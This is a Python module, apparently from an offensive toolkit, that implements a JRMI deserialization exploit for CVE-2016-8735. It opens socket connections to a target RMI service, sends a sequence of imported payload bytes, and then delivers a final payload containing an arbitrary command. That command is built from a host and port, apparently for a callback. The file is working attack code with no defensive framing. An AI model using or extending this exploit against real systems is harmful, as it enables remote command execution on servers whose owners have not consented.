import base64
import socket

from src.payloads.exploit_jrmi import payload_1__exploit_jrmi, payload_2__exploit_jrmi, \
    payload_3__exploit_jrmi, payload_4__exploit_jrmi, payload_5__exploit_jrmi, payload_6__exploit_jrmi
from src.utils.colors import Colors
from src.utils.misc import generate_cmd_for_runtime_exec, print_and_flush


def exploit_jrmi(url: str, host: str, port: int, cmd: str, is_win: bool) -> int:
    """
    Выполняет JRMI-десериализацию (CVE-2016-8735), отправляя сформированный payload и обрабатывая ответы.
    """
    cmd = generate_cmd_for_runtime_exec(
        cmd=cmd,
        host=host,
        port=port,
        is_win=is_win,
    )
    host_rmi, port_rmi = url.split(":", 1)[0], int(url.split(":", 1)[1])

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)
        s.connect((host_rmi, port_rmi))

        cmd_bytes = cmd.encode("utf-8")
        payload = (
                payload_1__exploit_jrmi
                + len(cmd_bytes).to_bytes(1, "big")
                + cmd_bytes
                + payload_2__exploit_jrmi
        )

        s.send(payload_3__exploit_jrmi)
        s.recv(1024)
        s.send(payload_4__exploit_jrmi)
        msg = s.recv(1024)

        port_rmi_platform = int(base64.b16encode(msg[-26:-24]), 16)

        s.send(payload_5__exploit_jrmi)
        s.recv(1024)
        s.send(payload_6__exploit_jrmi)
        s.close()

        # Второе соединение для отправки окончательного payload
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)
        s.connect((host_rmi, port_rmi))
        s.send(b"")
        s.recv(1024)
        s.send(b"")
        s.send(payload)
        s.close()

    except socket.error as err:
        print_and_flush(f"{Colors.RED}\n * [ERROR]: {err} ({host_rmi}:{port_rmi}).\n{Colors.ENDC}")
        return 505

    return 200
